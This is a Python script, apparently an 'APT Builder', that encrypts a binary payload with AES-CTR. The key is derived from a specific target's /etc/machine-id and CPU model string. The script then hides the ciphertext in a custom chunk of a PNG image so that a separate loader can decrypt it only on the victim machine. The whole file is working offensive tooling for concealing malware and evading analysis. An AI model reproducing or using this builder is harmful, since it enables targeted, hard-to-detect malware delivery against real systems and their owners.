import os
import struct
import argparse
import zlib
import ctypes
import subprocess
from Crypto.Hash import SHA256

# Configuración
CHUNK_NAME = b"loLO"
SALT = b"LO_IS_WATCHING"

# =============================================================================
# C Wrapper for consistency
# =============================================================================
class AES_ctx(ctypes.Structure):
    _fields_ = [("RoundKey", ctypes.c_uint8 * 240),
                ("Iv", ctypes.c_uint8 * 16)]

def compile_libcrypto():
    if not os.path.exists("./libcrypto.so"):
        print("[*] Compiling AES-256 micro-library for payload encryption compatibility...")
        try:
            subprocess.check_call(["gcc", "-shared", "-o", "libcrypto.so", "-fPIC", "loader_src/crypto_utils.c"])
        except Exception as e:
            print(f"[!] Failed to compile crypto lib: {e}")
            exit(1)

def encrypt_payload_custom(payload_data, key):
    compile_libcrypto()
    _lib = ctypes.CDLL("./libcrypto.so")

    nonce = os.urandom(8)
    iv = nonce + b'\x00'*8

    ctx = AES_ctx()
    key_buf = (ctypes.c_uint8 * 32).from_buffer_copy(key)
    iv_buf = (ctypes.c_uint8 * 16).from_buffer_copy(iv)

    _lib.AES_init_ctx_iv(ctypes.byref(ctx), key_buf, iv_buf)

    data_len = len(payload_data)
    data_buf = (ctypes.c_uint8 * data_len).from_buffer_copy(payload_data)

    _lib.AES_CTR_xcrypt_buffer(ctypes.byref(ctx), data_buf, data_len)

    return iv + bytes(data_buf)

# =============================================================================

def derive_key(machine_id, cpu_model):
    """Deriva la clave de cifrado basada en el entorno objetivo."""
    # Simular el comportamiento del loader C
    # En C: machine_id[32] bytes (leídos de archivo) + cpu_line (hasta newline) + SALT
    # machine_id suele tener un newline al final en archivo?
    # El archivo /etc/machine-id tiene 32 chars + \n.
    # El código C hace `read(fd, machine_id, 32)`. NO lee el newline.
    # Así que usamos los primeros 32 bytes de la string.

    m_id = machine_id.strip()[:32].encode()
    cpu = cpu_model.strip().encode() # El código C busca ':' y toma lo que sigue, quitando \n.

    raw_data = m_id + cpu + SALT
    hasher = SHA256.new(raw_data)
    return hasher.digest()

def create_png_chunk(type_bytes, data):
    if len(type_bytes) != 4:
        raise ValueError("Type must be 4 bytes")

    length = struct.pack(">I", len(data))
    chunk_type = type_bytes
    chunk_data = data
    crc = zlib.crc32(chunk_type + chunk_data) & 0xffffffff
    crc_bytes = struct.pack(">I", crc)

    return length + chunk_type + chunk_data + crc_bytes

def inject_chunk(png_path, chunk_data, output_path):
    with open(png_path, "rb") as f:
        png_data = f.read()

    if png_data[:8] != b'\x89PNG\r\n\x1a\n':
        raise ValueError("No es un archivo PNG válido")

    # Inyectar antes del final es suficiente
    iend_pos = png_data.rfind(b'IEND')
    if iend_pos == -1:
         # Fallback rudo: append
         new_png = png_data + chunk_data
    else:
         # IEND chunk starts 4 bytes before 'IEND' (length)
         chunk_start = iend_pos - 4
         new_png = png_data[:chunk_start] + chunk_data + png_data[chunk_start:]

    with open(output_path, "wb") as out:
        out.write(new_png)

def main():
    parser = argparse.ArgumentParser(description="The Architect - APT Builder")
    parser.add_argument("--machine-id", required=True, help="Target /etc/machine-id")
    parser.add_argument("--cpu-model", required=True, help="Target CPU Model String")
    parser.add_argument("--payload", required=True, help="Path to binary payload")
    parser.add_argument("--carrier", required=True, help="Path to input PNG")
    parser.add_argument("--output", default="image.png", help="Path to output PNG")

    args = parser.parse_args()

    print(f"[*] Target Machine ID: {args.machine_id}")
    print(f"[*] Target CPU: {args.cpu_model}")

    key = derive_key(args.machine_id, args.cpu_model)
    print(f"[*] Derived Key: {key.hex()[:8]}...")

    with open(args.payload, "rb") as f:
        p_data = f.read()

    encrypted_blob = encrypt_payload_custom(p_data, key)
    print(f"[*] Payload encrypted ({len(encrypted_blob)} bytes)")

    chunk = create_png_chunk(CHUNK_NAME, encrypted_blob)
    inject_chunk(args.carrier, chunk, args.output)
    print(f"[*] Build complete: {args.output}")

if __name__ == "__main__":
    main()
